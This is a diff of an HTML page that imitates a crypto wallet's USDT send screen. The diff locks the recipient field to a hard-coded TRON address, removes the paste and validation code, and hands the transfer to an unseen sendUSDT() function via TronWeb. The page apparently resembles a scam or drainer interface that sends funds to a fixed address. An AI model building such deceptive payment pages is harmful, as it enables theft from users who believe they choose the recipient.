@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -13,20 +12,17 @@
       color: white;
       font-family: Arial, sans-serif;
     }
-
     .container {
       max-width: 400px;
       margin: 0 auto;
       padding: 20px;
     }
-
     label {
       display: block;
       margin-bottom: 8px;
       font-weight: bold;
       color: #ccc;
     }
-
     .input-group {
       display: flex;
       align-items: center;
@@ -36,7 +32,6 @@
       padding: 10px;
       margin-bottom: 20px;
     }
-
     input[type="text"],
     input[type="number"] {
       flex: 1;
@@ -46,7 +41,6 @@
       outline: none;
       font-size: 16px;
     }
-
     .input-group button {
       margin-left: 10px;
       background-color: transparent;
@@ -55,13 +49,11 @@
       cursor: pointer;
       font-size: 14px;
     }
-
     .usd-value {
       margin-top: -10px;
       margin-bottom: 20px;
       color: #999;
     }
-
     .next-button {
       width: 100%;
       background-color: #00cc66;
@@ -73,14 +65,12 @@
       border-radius: 50px;
       cursor: pointer;
     }
-
     .icon {
       width: 18px;
       height: 18px;
       fill: #00ff99;
       vertical-align: middle;
     }
-
     .input-group svg {
       margin-left: 8px;
       cursor: pointer;
@@ -91,11 +81,7 @@
   <div class="container">
     <label for="address">Address or Domain Name</label>
     <div class="input-group">
-      <input type="text" id="address" value="TQP59pp5o9x6ohP8A6NWqUu9iJ3LfTNEKQ" />
-      <button onclick="pasteAddress()">Paste</button>
-      <svg class="icon" viewBox="0 0 24 24">
-        <path d="M3 3h6v2H5v14h14v-4h2v6H3V3zm18-1v8h-8V2h8zm-2 2h-4v4h4V4zm-8 6h10v2H11v-2zm0 4h10v2H11v-2zm0 4h6v2h-6v-2z"/>
-      </svg>
+      <input type="text" id="address" value="TQP59pp5o9x6ohP8A6NWqUu9iJ3LfTNEKQ" disabled />
     </div>
 
     <label for="amount">Amount</label>
@@ -107,42 +93,10 @@
 
     <div class="usd-value" id="usdValue">≈ $0.00</div>
 
-    <button id="Next" class="next-button" onclick="next()">Next</button>
+    <button class="next-button" onclick="sendUSDT()">Next</button>
   </div>
 
-  <script>
-    function pasteAddress() {
-      navigator.clipboard.readText().then((text) => {
-        document.getElementById('address').value = text;
-      });
-    }
-
-    function setMax() {
-      const maxAmount = 100; // Change as needed
-      document.getElementById("amount").value = maxAmount;
-      updateUSD();
-    }
-
-    function updateUSD() {
-      const amount = parseFloat(document.getElementById("amount").value || "0");
-      const usdValue = amount * 1; // USDT assumed 1:1
-      document.getElementById("usdValue").innerText = `≈ $${usdValue.toFixed(2)}`;
-    }
-
-    function next() {
-      const address = document.getElementById("address").value;
-      const amount = parseFloat(document.getElementById("amount").value);
-
-      if (!address || isNaN(amount) || amount <= 0) {
-        alert("Please fill in both a valid address and amount greater than 0.");
-        return;
-      }
-
-      // You can redirect or handle form here
-      console.log("Sending to:", address, "Amount:", amount);
-    }
-  </script>
-  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
   <script src="script.js"></script>
 </body>
 </html>
